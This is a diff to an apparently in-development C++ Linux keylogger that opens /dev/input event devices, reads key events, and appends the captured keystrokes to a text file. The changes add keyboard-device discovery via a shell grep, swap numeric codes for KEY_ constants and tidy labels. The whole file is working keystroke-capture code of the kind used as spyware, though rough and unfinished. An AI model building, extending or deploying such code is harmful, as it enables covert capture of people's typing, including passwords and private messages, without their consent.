@@ -11,6 +11,7 @@
 #include <linux/input-event-codes.h>
 #include <dirent.h>
 #include <chrono>
+#include <ranges>
 #include<thread>
 /*
  * UNIX
@@ -21,6 +22,7 @@
  */
 
 //determines the os
+
 int type_os()
 {
     #ifdef _WIN32
@@ -77,32 +79,29 @@ void one_time_creation() {
 }
 
 
+std::vector<std::string> find_keyboard() {
+    std::vector<std::string> result;
 
+    std::fstream temp_file = std::fstream("temp.txt", std::ios::in | std::ios::out | std::ios::trunc);
 
-
-std::string find_keyboard() {
-    const char* path = "/dev/input/bus/input/";
-
-    DIR *dir = opendir(path);
-    if(!dir) {
-        std::cerr << "empty dir" <<std::endl;
-        return "";
+    if (!temp_file.is_open()) {
+        std::cerr << "Can't open temp file" << std::endl;
+        return {};
     }
+    std::cout << exc("grep 'kbd' linux_devices > temp.txt") << std::endl;
+    std::string line;
 
-    struct dirent *entry;
+    while(std::getline(temp_file, line, ' ')) {
 
-    while ((entry = readdir(dir))) {
-        std::string file = entry->d_name;
-
-        if (file.find("kbd") != std::string::npos) {
-            closedir(dir);
-            return path+file;
+        if(line.find("event") != std::string::npos) {
+            result.push_back(line);
         }
+
     }
 
-    return "";
+    temp_file.close();
+    return result;
 }
-
 
 
 bool is_specia_key(int key)
@@ -117,11 +116,11 @@ bool is_specia_key(int key)
             file << "[BACKSPACE]";
         file.close();
         return true;
-        case 15:
+        case KEY_TAB:
             file << "[TAB]";
         file.close();
         return true;
-        case 28:
+        case KEY_ENTER:
             file << "[ENTER] + " << std::endl;
             file.close();
         return true;
@@ -134,7 +133,7 @@ bool is_specia_key(int key)
             file.close();
         return true;
         case 856:
-            file << "<ALT] " << std::endl;
+            file << "[ALT] " << std::endl;
             file.close();
             return true;
         default:
@@ -154,12 +153,24 @@ int linux_keyboard()
     using namespace std::this_thread;
 
     std::fstream file("test.txt",std::ios::out | std::ios::app );
-    /*TODO:
-     *Automize the device output
-     *(sometimes the event can be differnt)
-     *the user could also have multiple input devices
-     */
-    const char* device_input = ("/dev/input/event0");
+
+
+    for (auto i : find_keyboard()) {
+        std::string device_input = "/dev/input/" + i;
+        // std::cout << device_input.c_str() << std::endl;
+        int device = open(device_input.c_str(), O_RDONLY);
+        if (device ==-1) {
+            std::cerr << "HALP" << std::endl;
+            return 1;
+
+        }
+       std::cout <<device_input.c_str() << std::endl;
+        device_input = "/dev/input/" + i;
+        break; // this is just for now
+    }
+
+    std::string d = "/dev/input/event0";
+    const char* device_input = (d.c_str());
     int device = open(device_input, O_RDONLY);
     if(device == -1) {
         std::cerr << "HALP" << std::endl;
@@ -171,10 +182,10 @@ int linux_keyboard()
         struct input_event ev;
 
         while (true){
+
             if(ssize_t r = read(device, &ev, sizeof(struct input_event)); r < static_cast<ssize_t>(sizeof(ev))) {
                 return 1;
             }
-
             if(ev.type == EV_KEY) {
                 std::cout << ev.code << std::endl;
                 if(!is_specia_key(ev.code)) {
@@ -192,9 +203,8 @@ int linux_keyboard()
     return 0;
 }
 
-
 int main() {
-
+    find_keyboard();
     one_time_creation();
     linux_keyboard();
     return 0;
